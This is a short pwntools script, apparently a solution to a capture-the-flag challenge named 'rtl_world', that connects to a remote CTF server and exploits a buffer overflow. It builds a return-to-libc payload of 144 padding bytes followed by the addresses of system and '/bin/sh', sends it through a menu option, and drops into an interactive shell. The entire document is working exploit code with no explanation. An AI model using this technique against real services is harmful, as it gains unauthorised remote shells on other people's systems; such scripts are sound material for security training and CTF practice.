from pwn import *

#p = process("./rtl_world")
r = remote('ctf.j0n9hyun.xyz', 3010)
e = ELF("./rtl_world")

system = e.symbols['system']
binsh = e.search('/bin/sh').next()
payload = ''
payload += "A"*144
payload += p32(system)
payload += "AAAA"
payload += p32(binsh)

print r.recvuntil(">>> ")
r.sendline("5")
print r.recvuntil("[Attack] > ")
r.sendline(payload)
r.interactive()
